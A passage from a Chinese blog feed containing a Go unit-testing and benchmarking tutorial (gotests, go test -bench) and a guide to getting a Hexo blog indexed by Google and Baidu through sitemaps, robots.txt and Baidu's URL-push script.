class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestXxx</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>    <span class="hljs-keyword">type</span> args <span class="hljs-keyword">struct</span> &#123;<br>        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Add function input parameter definition.</span><br>    &#125;<br><br>    <span class="hljs-keyword">type</span> want <span class="hljs-keyword">struct</span> &#123;<br>         <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Add function return parameter definition.</span><br>    &#125;<br>    tests := []<span class="hljs-keyword">struct</span> &#123;<br>        name <span class="hljs-type">string</span><br>        args args<br>        want want<br>    &#125;&#123;<br>        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Add test cases.</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> _, tt := <span class="hljs-keyword">range</span> tests &#123;<br>        t.Run(tt.name, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>            <span class="hljs-keyword">if</span> got := Xxx(tt.args); got != tt.want &#123;<br>                t.Errorf(<span class="hljs-string">&quot;Xxx() = %v, want %v&quot;</span>, got, tt.want)<br>            &#125;<br>        &#125;)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>既然测试用例可以抽象成一些模型，那么我们就可以基于这些模型来自动生成测试代码。Go社区中有一些优秀的工具可以自动生成测试代码，我推荐你使用 <a href="https://github.com/cweill/gotests">gotests</a> 工具。</p><p>下面，讲讲gotests工具的使用方法，可以分成三个步骤。</p><p>第一步，安装gotests工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go get -u github.com/cweill/gotests/...<br><br></code></pre></td></tr></table></figure><p>gotests命令执行格式为： <code>gotests [options] [PATH] [FILE] ...</code>。gotests可以为 <code>PATH</code> 下的所有Go源码文件中的函数生成测试代码，也可以只为某个 <code>FILE</code> 中的函数生成测试代码。</p><p>第二步，进入测试代码目录，执行gotests生成测试用例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gotests -all -w .<br><br></code></pre></td></tr></table></figure><p>上面的命令会为当前目录下所有Go源码文件中的函数生成测试代码。</p><p>第三步，添加测试用例：</p><p>生成完测试用例，你只需要添加需要测试的输入和预期的输出就可以了。下面的测试用例是通过gotests生成的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestUnpointer</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>    <span class="hljs-keyword">type</span> args <span class="hljs-keyword">struct</span> &#123;<br>        offset *<span class="hljs-type">int64</span><br>        limit  *<span class="hljs-type">int64</span><br>    &#125;<br>    tests := []<span class="hljs-keyword">struct</span> &#123;<br>        name <span class="hljs-type">string</span><br>        args args<br>        want *LimitAndOffset<br>    &#125;&#123;<br>        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Add test cases.</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> _, tt := <span class="hljs-keyword">range</span> tests &#123;<br>        t.Run(tt.name, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>            <span class="hljs-keyword">if</span> got := Unpointer(tt.args.offset, tt.args.limit); !reflect.DeepEqual(got, tt.want) &#123;<br>                t.Errorf(<span class="hljs-string">&quot;Unpointer() = %v, want %v&quot;</span>, got, tt.want)<br>            &#125;<br>        &#125;)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们只需要补全 <code>TODO</code> 位置的测试数据即可，补全后的测试用例见 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/pkg/util/gormutil/gorm_test.go">gorm_test.go</a> 文件。</p><h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>接下来我们来看下性能测试，它是用来测试代码的性能是否满足需求的。</p><p>性能测试的用例函数必须以 <code>Benchmark</code> 开头，例如 <code>BenchmarkXxx</code> 或 <code>Benchmark_Xxx</code>（ <code>Xxx</code> 部分为任意字母数字组合，首字母大写）。</p><p>函数参数必须是 <code>*testing.B</code>，函数内以 <code>b.N</code> 作为循环次数，其中 <code>N</code> 会在运行时动态调整，直到性能测试函数可以持续足够长的时间，以便能够可靠地计时。下面的代码是一个简单的性能测试函数（函数位于文件 <a href="https://github.com/marmotedu/gopractise-demo/blob/master/test/math_test.go">math_test.go</a> 中）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkRandInt</span><span class="hljs-params">(b *testing.B)</span></span> &#123;<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br>        RandInt()<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>go test</code> 命令默认不会执行性能测试函数，需要通过指定参数 <code>-bench &lt;pattern&gt;</code> 来运行性能测试函数。 <code>-bench</code> 后可以跟正则表达式，选择需要执行的性能测试函数，例如 <code>go test -bench=&quot;.*&quot;</code> 表示执行所有的压力测试函数。执行 <code>go test -bench=&quot;.*&quot;</code> 后输出如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -bench=<span class="hljs-string">&quot;.*&quot;</span><br>goos: linux<br>goarch: amd64<br>pkg: github.com/marmotedu/gopractise-demo/31/test<br>BenchmarkRandInt-4      97384827                12.4 ns/op<br>PASS<br>ok      github.com/marmotedu/gopractise-demo/31/test    1.223s<br><br></code></pre></td></tr></table></figure><p>上面的结果只显示了性能测试函数的执行结果。 <code>BenchmarkRandInt</code> 性能测试函数的执行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">BenchmarkRandInt-4   90848414        12.8 ns/op<br><br></code></pre></td></tr></table></figure><p>每个函数的性能执行结果一共有3列，分别代表不同的意思，这里用上面的函数举例子：</p><ul><li><code>BenchmarkRandInt-4</code>， <code>BenchmarkRandInt</code> 表示所测试的测试函数名，4表示有4个CPU线程参与了此次测试，默认是 <code>GOMAXPROCS</code> 的值。</li><li><code>90848414</code> ，说明函数中的循环执行了 <code>90848414</code> 次。</li><li><code>12.8 ns/op</code>，说明每次循环的执行平均耗时是 <code>12.8</code> 纳秒，该值越小，说明代码性能越高。</li></ul><p>如果我们的性能测试函数在执行循环前，需要做一些耗时的准备工作，我们就需要重置性能测试时间计数，例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkBigLen</span><span class="hljs-params">(b *testing.B)</span></span> &#123;<br>    big := NewBig()<br>    b.ResetTimer()<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br>        big.Len()<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>当然，我们也可以先停止性能测试的时间计数，然后再开始时间计数，例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkBigLen</span><span class="hljs-params">(b *testing.B)</span></span> &#123;<br>b.StopTimer() <span class="hljs-comment">// 调用该函数停止压力测试的时间计数</span><br>big := NewBig()<br>b.StartTimer() <span class="hljs-comment">// 重新开始时间</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br>big.Len()<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>B类型的性能测试还支持下面 4 个参数。</p><ul><li>benchmem，输出内存分配统计：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -bench=<span class="hljs-string">&quot;.*&quot;</span> -benchmem<br>goos: linux<br>goarch: amd64<br>pkg: github.com/marmotedu/gopractise-demo/31/test<br>BenchmarkRandInt-4      96776823                12.8 ns/op             0 B/op          0 allocs/op<br>PASS<br>ok      github.com/marmotedu/gopractise-demo/31/test    1.255s<br><br></code></pre></td></tr></table></figure><p>指定了 <code>-benchmem</code> 参数后，执行结果中又多了两列： 0 B&#x2F;op，表示每次执行分配了多少内存（字节），该值越小，说明代码内存占用越小；0 allocs&#x2F;op，表示每次执行分配了多少次内存，该值越小，说明分配内存次数越少，意味着代码性能越高。</p><ul><li>benchtime，指定测试时间和循环执行次数（格式需要为Nx，例如100x）：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -bench=<span class="hljs-string">&quot;.*&quot;</span> -benchtime=10s <span class="hljs-comment"># 指定测试时间</span><br>goos: linux<br>goarch: amd64<br>pkg: github.com/marmotedu/gopractise-demo/31/test<br>BenchmarkRandInt-4      910328618               13.1 ns/op<br>PASS<br>ok      github.com/marmotedu/gopractise-demo/31/test    13.260s<br>$ go <span class="hljs-built_in">test</span> -bench=<span class="hljs-string">&quot;.*&quot;</span> -benchtime=100x <span class="hljs-comment"># 指定循环执行次数</span><br>goos: linux<br>goarch: amd64<br>pkg: github.com/marmotedu/gopractise-demo/31/test<br>BenchmarkRandInt-4           100                16.9 ns/op<br>PASS<br>ok      github.com/marmotedu/gopractise-demo/31/test    0.003s<br><br></code></pre></td></tr></table></figure><ul><li>cpu，指定GOMAXPROCS。</li><li>timeout，指定测试函数执行的超时时间：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -bench=<span class="hljs-string">&quot;.*&quot;</span> -<span class="hljs-built_in">timeout</span>=10s<br>goos: linux<br>goarch: amd64<br>pkg: github.com/marmotedu/gopractise-demo/31/test<br>BenchmarkRandInt-4      97375881                12.4 ns/op<br>PASS<br>ok      github.com/marmotedu/gopractise-demo/31/test    1.224s<br><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>代码开发完成之后，我们需要为代码编写单元测试用例，并根据需要，给一些函数编写性能测试用例。Go语言提供了 <code>testing</code> 包，供我们编写测试用例，并通过 <code>go test</code> 命令来执行这些测试用例。</p><p>go test在执行测试用例时，会查找具有固定格式的Go源码文件名，并执行其中具有固定格式的函数，这些函数就是测试用例。这就要求我们的测试文件名、函数名要符合 <code>go test</code> 工具的要求：Go的测试文件名必须以 <code>_test.go</code> 结尾；测试用例函数必须以 <code>Test</code> 、 <code>Benchmark</code> 、 <code>Example</code> 开头。此外，我们在编写测试用例时，还要注意包和变量的命名规范。</p><p>Go项目开发中，编写得最多的是单元测试用例。单元测试用例函数以 <code>Test</code> 开头，例如 <code>TestXxx</code> 或 <code>Test_xxx</code> （ <code>Xxx</code> 部分为任意字母数字组合，首字母大写）。函数参数必须是 <code>*testing.T</code> ，可以使用该类型来记录错误或测试状态。我们可以调用 <code>testing.T</code> 的 <code>Error</code> 、 <code>Errorf</code> 、 <code>FailNow</code> 、 <code>Fatal</code> 、 <code>FatalIf</code> 方法，来说明测试不通过；调用 <code>Log</code> 、 <code>Logf</code> 方法来记录测试信息。</p><p>下面是一个简单的单元测试函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestAbs</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>    got := Abs(<span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">if</span> got != <span class="hljs-number">1</span> &#123;<br>        t.Errorf(<span class="hljs-string">&quot;Abs(-1) = %f; want 1&quot;</span>, got)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编写完测试用例之后，可以使用 <code>go test</code> 命令行工具来执行这些测试用例。</p><p>此外，我们还可以使用 <a href="https://github.com/cweill/gotests">gotests</a> 工具，来自动地生成单元测试用例，从而减少编写测试用例的工作量。</p><p>我们在Go项目开发中，还经常需要编写性能测试用例。性能测试用例函数必须以 <code>Benchmark</code> 开头，以 <code>*testing.B</code> 作为函数入参，通过 <code>go test -bench &lt;pattern&gt;</code> 运行。</p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何让你的个人博客能被谷歌百度访问到</title>
    <link href="/2022/11/29/%E5%A6%82%E4%BD%95%E8%AE%A9%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E8%83%BD%E8%A2%AB%E8%B0%B7%E6%AD%8C%E7%99%BE%E5%BA%A6%E8%AE%BF%E9%97%AE%E5%88%B0/"/>
    <url>/2022/11/29/%E5%A6%82%E4%BD%95%E8%AE%A9%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E8%83%BD%E8%A2%AB%E8%B0%B7%E6%AD%8C%E7%99%BE%E5%BA%A6%E8%AE%BF%E9%97%AE%E5%88%B0/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer">#                  如何让你的个人博客能被谷歌百度访问到<blockquote><p>主要内容来自于<a href="http://www.zh0ngtian.tech/posts/9c6445f3.html">搜索引擎优化（SEO）</a></p></blockquote><h1 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h1><h2 id="验证网站所有权"><a href="#验证网站所有权" class="headerlink" title="验证网站所有权"></a>验证网站所有权</h2><p>在 <a href="https://search.google.com/search-console/ownership">Google Search Console - 所有权</a> 中进行所有权验证。</p><p>方法一：通过 HTML 文件验证（推荐）</p><ul><li>将提供的 HTML 文件放在博客文件夹的 <code>source</code> 目录下</li><li>在博客的配置文件中添加 <code>skip_render: googleacxxxxxxxxxxxxxx.html</code> 跳过该验证文件的渲染</li></ul><p>方法二：通过 DNS 记录验证</p><ul><li>在腾讯云控制台搜索“DNS 解析”进入</li><li>进入当前域名解析的配置<br><a href="http://img.zh0ngtian.tech/2020-12-13-22cERh.jpg"><img src="http://img.zh0ngtian.tech/2020-12-13-22cERh.jpg" alt="img"></a></li><li>添加记录<br><a href="http://img.zh0ngtian.tech/2020-12-13-OkCBFJ.jpg"><img src="http://img.zh0ngtian.tech/2020-12-13-OkCBFJ.jpg" alt="img"></a></li></ul><h2 id="被动索引"><a href="#被动索引" class="headerlink" title="被动索引"></a>被动索引</h2><h3 id="提交站点地图"><a href="#提交站点地图" class="headerlink" title="提交站点地图"></a>提交站点地图</h3><p>1.生成站点地图</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-generator-sitemap</span><br></code></pre></td></tr></table></figure><p>此时使用 <code>hexo g</code> 后就会在 <code>public</code> 文件夹下生成 <code>sitemap.xml</code> 文件。</p><p>2.提交站点地图<br>在 <a href="https://search.google.com/search-console/sitemaps">Google Search Console - 站点地图</a> 中添加新的站点地图，在输入栏中输入 <code>http://your_blog_url/sitemap.xml</code> 然后提交。接下来就等待 Google 自动爬取博客内容就可以了。</p><h3 id="请求编入索引"><a href="#请求编入索引" class="headerlink" title="请求编入索引"></a>请求编入索引</h3><p>虽然搜索引擎会自动根据站点地图爬取网页内容，但是如果你的网站权重不高的话这个过程可能会比较久。如果你希望 Google 立即收录你的网页，可以直接在 <a href="https://search.google.com/search-console">Google Search Console</a> 上方输入你想被收录的网页，然后点击<strong>请求编入索引</strong>，等待片刻你的网页就可以被 Google 搜索到了。</p><h3 id="添加-nofollow-标签"><a href="#添加-nofollow-标签" class="headerlink" title="添加 nofollow 标签"></a>添加 nofollow 标签</h3><p>一般博客中都会引用一些其他链接，为了防止搜索引擎抓取这些链接而导致分散网站权重，需要为这些站外链接设置 nofollow 标签，可以使用 <code>hexo-autonofollow</code> 插件自动完成这一个步骤。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-autonofollow</span><br></code></pre></td></tr></table></figure><p>需要在博客配置文件_config.yml中配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">nofollow:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="添加-robots-txt"><a href="#添加-robots-txt" class="headerlink" title="添加 robots.txt"></a>添加 <code>robots.txt</code></h3><blockquote><p>robots.txt 是一种存放于网站根目录下的 ASCII 编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。robots.txt 是一个协议，而不是一个命令。robots.txt 是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt 文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在 robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p></blockquote><p>在博客的 <code>source</code> 文件夹下新建 <code>robots.txt</code> 文件，内容如下：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dts">User-agent: *<br><span class="hljs-symbol">Allow:</span> /<br><span class="hljs-symbol">Allow:</span> <span class="hljs-keyword">/archives/</span><br><span class="hljs-symbol">Allow:</span> <span class="hljs-keyword">/categories/</span><br><span class="hljs-symbol">Allow:</span> <span class="hljs-keyword">/tags/</span><br><span class="hljs-symbol">Allow:</span> <span class="hljs-keyword">/about/</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/js/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/css/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/fonts/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/vendor/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/styles/</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">Sitemap:</span> http:<span class="hljs-comment">//longpi1.com/sitemap.xml</span><br></code></pre></td></tr></table></figure><h2 id="主动推送"><a href="#主动推送" class="headerlink" title="主动推送"></a>主动推送</h2><p>参考 <a href="https://cjh0613.com/20200603HexoSubmitUrlsToSearchEngine.html">hexo-submit-urls-to-search-engine 中文文档</a>。</p><h1 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h1><h2 id="验证网站所有权-1"><a href="#验证网站所有权-1" class="headerlink" title="验证网站所有权"></a>验证网站所有权</h2><p>进入<a href="https://link.zhihu.com/?target=https://ziyuan.baidu.com/">百度资源搜索平台</a>，点击上方“用户中心”，选择“站点管理”-“添加网站”，按照提示进行。</p><p>验证方式同 Google，如果选择 CNAME 验证，注意主机名需要填百度给出的网址前缀，也就是说，下面两张图的黑色块部分的内容应该是相同的。</p><p>百度站点管理：<br><a href="http://img.zh0ngtian.tech/2020-12-13-AD0C747F-DA15-4DD5-8840-F0980F499CA3.png"><img src="http://img.zh0ngtian.tech/2020-12-13-AD0C747F-DA15-4DD5-8840-F0980F499CA3.png" alt="img"></a></p><p>腾讯云 DNS 设置控制台：<br><a href="http://img.zh0ngtian.tech/2020-12-13-5A092612-2989-4368-8699-DEA75E92AE40.png"><img src="http://img.zh0ngtian.tech/2020-12-13-5A092612-2989-4368-8699-DEA75E92AE40.png" alt="img"></a></p><h2 id="主动推送-1"><a href="#主动推送-1" class="headerlink" title="主动推送"></a>主动推送</h2><p>1.安装插件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">npm <span class="hljs-keyword">install </span>hexo-<span class="hljs-keyword">baidu-url-submit</span><br><span class="hljs-keyword"></span>Copy<br></code></pre></td></tr></table></figure><p>2.修改配置</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta"># _config.yml</span><br><span class="hljs-symbol">baidu_url_submit:</span><br><span class="hljs-symbol">  count:</span> <span class="hljs-number">100</span> <span class="hljs-meta"># 提交最新的多少个链接</span><br><span class="hljs-symbol">  host:</span> www.longpi1.com <span class="hljs-meta"># 在百度站长平台中添加的域名</span><br><span class="hljs-symbol">  token:</span> <br><span class="hljs-symbol">  path:</span> baidu_urls.txt<br></code></pre></td></tr></table></figure><p>3.配置中的 token 可以在百度站长平台找到，步骤如下图所示，黑色块挡住的就是 token：</p><p><a href="http://img.zh0ngtian.tech/2020-12-13-230DE174-E873-4D92-B46E-B27B0BD49544.png"><img src="http://img.zh0ngtian.tech/2020-12-13-230DE174-E873-4D92-B46E-B27B0BD49544.png" alt="img"></a></p><p><a href="http://img.zh0ngtian.tech/2020-12-13-7923A1AE-6BA5-478C-95D2-B3436674F5D4.png"><img src="http://img.zh0ngtian.tech/2020-12-13-7923A1AE-6BA5-478C-95D2-B3436674F5D4.png" alt="img"></a></p><p>注意这里一定要和在站长平台中添加的域名一直，如果站长平台中前缀有 www 而配置中没有写，主动推送时将会报错 not_same_site。</p><p>4.在 <code>_config.yml</code> 加入新的 deployer</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">deploy</span>:<br>  - <span class="hljs-keyword">type</span>: git<br>    repo: root@longpi1.com:/root/hexo.git<br>  - <span class="hljs-keyword">type</span>: baidu_url_submitter<br><br></code></pre></td></tr></table></figure><p>5.最后上传就可以了,这样显示就是成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;remain&quot;</span>:2985,<span class="hljs-string">&quot;success&quot;</span>:15&#125;           <span class="hljs-comment">#表示成功15条</span><br>INFO  Deploy <span class="hljs-keyword">done</span>: baidu_url_submitter<br></code></pre></td></tr></table></figure><h2 id="自动推送"><a href="#自动推送" class="headerlink" title="自动推送"></a>自动推送</h2><p>1.复制代码</p><p><img src="https://pic3.zhimg.com/80/v2-8262508cd4d408132e75a737f23dd26e_1440w.webp" alt="img"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> bp = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);<br>    <span class="hljs-keyword">var</span> curProtocol = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">protocol</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">if</span> (curProtocol === <span class="hljs-string">&#x27;https&#x27;</span>) &#123;<br>        bp.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;https://zz.bdstatic.com/linksubmit/push.js&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        bp.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;http://push.zhanzhang.baidu.com/push.js&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">var</span> s = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;script&quot;</span>)[<span class="hljs-number">0</span>];<br>    s.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">insertBefore</span>(bp, s);<br>&#125;)();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>2.放到<code>\themes\material-x\layout\_partial\head.ejs</code>的<code>&lt;head&gt;</code>与 <code>&lt;/head&gt;</code>标签之间。</p><p>3.如果主题集成了这个功能，比如 next 主题，在 <code>themes\next\layout_scripts\</code> 下有个 <code>baidu_push.swig</code> 写入下面代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;% <span class="hljs-keyword">if</span> theme.<span class="hljs-property">baidu_push</span> %&#125;<br>&lt;script&gt;<br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> bp = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);<br>    <span class="hljs-keyword">var</span> curProtocol = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">protocol</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">if</span> (curProtocol === <span class="hljs-string">&#x27;https&#x27;</span>) &#123;<br>        bp.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;https://zz.bdstatic.com/linksubmit/push.js&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        bp.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;http://push.zhanzhang.baidu.com/push.js&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">var</span> s = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span 